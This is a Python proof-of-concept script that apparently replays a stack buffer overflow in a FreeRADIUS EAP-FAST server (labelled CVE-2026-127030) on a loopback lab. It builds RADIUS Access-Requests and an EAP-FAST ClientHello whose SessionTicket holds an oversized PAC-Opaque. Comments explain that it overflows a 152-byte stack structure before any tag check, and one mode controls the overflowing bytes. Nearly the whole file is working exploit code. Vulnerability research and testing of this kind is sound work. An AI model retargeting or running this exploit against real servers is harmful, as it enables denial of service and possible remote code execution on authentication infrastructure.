#!/usr/bin/env python3
"""Loopback-only RADIUS test peer for CVE-2026-127030 live replay.

Sends Access-Request(Identity), reads Access-Challenge(State), then sends
Access-Request(EAP-FAST ClientHello) whose SessionTicket extension holds an
oversized PAC-Opaque (hdr.length=256, 260 bytes total).  No off-host traffic.

Usage: peer.py <key-unknown|key-known> [--prefix] [--port N] [--outdir DIR]
"""
import binascii
import hmac
import hashlib
import os
import socket
import struct
import sys

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

HOST = "127.0.0.1"
PORT = 18120
SECRET = b"testing123"
AUTH_ID = b"freeradius2shell-lab"
KEY = b"0123456789abcdef0123456789ABCDEF"
A_ID = hashlib.md5(AUTH_ID).digest()
LENGTH = 256  # attacker's hdr.length -> dlen = 208 into a 152-byte stack struct


def chunks(data, n=253):
    return [data[i:i + n] for i in range(0, len(data), n)]


def attrs(t, value):
    return b"".join(bytes([t, len(c) + 2]) + c for c in chunks(value))


def packet(code, ident, auth, raw_attrs):
    # Message-Authenticator: HMAC-MD5 over the packet with the field zeroed.
    ma = attrs(80, b"\x00" * 16)
    body = bytes([code, ident]) + struct.pack("!H", 20 + len(raw_attrs) + len(ma)) + auth + raw_attrs + ma
    mac = hmac.new(SECRET, body, hashlib.md5).digest()
    off = len(body) - 16
    return body[:off] + mac + body[off + 16:]


def parse(data):
    code, ident, length = data[0], data[1], struct.unpack("!H", data[2:4])[0]
    out = {"code": code, "id": ident, "length": length, "attrs": {}}
    p = 20
    while p + 2 <= min(length, len(data)):
        t, l = data[p], data[p + 1]
        if l < 2 or p + l > len(data):
            break
        out["attrs"].setdefault(t, []).append(data[p + 2:p + l])
        p += l
    return out


def ticket(mode, iv):
    if mode == "key-known":
        # AES-GCM ciphertext of a chosen plaintext; plaintext bytes are
        # deterministic under the lab's configured pac_opaque_key.
        plain = (b"FREERADIUS2SHELL-LIVE-MARKER-" * 7)[:208]
        cipher = AESGCM(KEY).encrypt(iv, plain, A_ID)[:208]
    else:
        # Key unknown to the peer: ciphertext bytes chosen, plaintext
        # (ciphertext XOR keystream) unpredictable.  Length-only control.
        cipher = bytes((0x41 + (i % 26)) for i in range(208))
    tag = b"\x00" * 16  # tag is never verified before the overflow write
    return struct.pack("!HH", 2, LENGTH) + A_ID + iv + tag + cipher


def clienthello(tkt, prefix):
    ext_payload = (struct.pack("!H", len(tkt)) if prefix else b"") + tkt
    ext = struct.pack("!HH", 0x0023, len(ext_payload)) + ext_payload
    suites = struct.pack("!HHHH", 0x0035, 0x002f, 0x000a, 0x003c)
    body = (struct.pack("!H", 0x0303) + b"\x11" * 32 + b"\x00" +
            struct.pack("!H", len(suites)) + suites + b"\x01\x00" +
            struct.pack("!H", len(ext)) + ext)
    hs = b"\x01" + len(body).to_bytes(3, "big") + body
    return b"\x16\x03\x03" + struct.pack("!H", len(hs)) + hs


def main():
    mode = "key-unknown"
    prefix = False
    port = PORT
    outdir = None
    args = sys.argv[2:]
    while args:
        a = args.pop(0)
        if a == "--prefix":
            prefix = True
        elif a == "--port":
            port = int(args.pop(0))
        elif a == "--outdir":
            outdir = args.pop(0)
    if len(sys.argv) > 1 and sys.argv[1] in ("key-known", "key-unknown"):
        mode = sys.argv[1]
    if outdir:
        os.makedirs(outdir, exist_ok=True)

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(6)

    # Step 1: EAP Response/Identity, no State.
    eap_id = struct.pack("!BBH", 2, 1, 8) + b"\x01bob"
    req = packet(1, 1, os.urandom(16),
                 attrs(1, b"bob") + attrs(79, eap_id))
    if outdir:
        open(os.path.join(outdir, "req1.bin"), "wb").write(req)
    s.sendto(req, (HOST, port))
    try:
        resp = s.recv(65535)
    except socket.timeout:
        print("STEP1: no reply (timeout)")
        return 2
    r1 = parse(resp)
    print("STEP1 reply code=%d attrs=%s" % (r1["code"], sorted(r1["attrs"])))
    state = b"".join(r1["attrs"].get(24, []))
    if not state:
        print("STEP1: no State attribute; cannot continue")
        return 3

    # Step 2: EAP Response/FAST with oversized SessionTicket extension.
    iv = b"\x01" * 16
    tkt = ticket(mode, iv)
    rec = clienthello(tkt, prefix)
    eap_fast = struct.pack("!BBH", 2, 2, 6 + len(rec)) + bytes([43, 0x00]) + rec
    a2 = attrs(1, b"bob") + attrs(79, eap_fast) + attrs(24, state)
    req2 = packet(1, 2, os.urandom(16), a2)
    if outdir:
        open(os.path.join(outdir, "req2.bin"), "wb").write(req2)
        open(os.path.join(outdir, "ticket.bin"), "wb").write(tkt)
    print("STEP2 sending: eap_len=%d tkt_len=%d hdr.length=%d dlen=%d mode=%s prefix=%s" %
          (len(eap_fast), len(tkt), LENGTH, LENGTH - 48, mode, prefix))
    print("STEP2 ticket sha256=%s" % hashlib.sha256(tkt).hexdigest())
    print("STEP2 a_id=%s" % binascii.hexlify(A_ID).decode())
    s.sendto(req2, (HOST, port))
    try:
        resp2 = s.recv(65535)
        r2 = parse(resp2)
        print("STEP2 reply code=%d attrs=%s" % (r2["code"], sorted(r2["attrs"])))
    except socket.timeout:
        print("STEP2: no reply (timeout) - consistent with server crash")
    s.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
